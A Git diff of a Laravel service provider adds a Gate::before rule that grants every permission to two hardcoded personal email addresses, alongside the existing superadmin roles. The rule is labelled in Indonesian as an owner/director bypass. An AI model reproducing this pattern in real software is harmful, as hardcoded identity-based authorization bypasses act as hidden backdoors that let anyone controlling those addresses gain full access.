@@ -20,7 +20,20 @@ class AppServiceProvider extends ServiceProvider
     public function boot(): void
     {
         \Illuminate\Support\Facades\Gate::before(function ($user, $ability) {
-            return in_array(strtolower($user->role), ['superadmin', 'superhyperadmin']) ? true : null;
+            // Bypass Gate authorization otomatis untuk roles khusus
+            if (in_array(strtolower($user->role), ['superadmin', 'superhyperadmin'])) {
+                return true;
+            }
+            
+            // Bypass Gate authorization otomatis untuk email-email direksi/owner di server
+            if (in_array(strtolower($user->email), [
+                'windyriche@gmail.com',
+                'rizkyfiqi4@gmail.com'
+            ])) {
+                return true;
+            }
+            
+            return null;
         });
 
         // Otorisasi eksklusif Opcodes Log Viewer
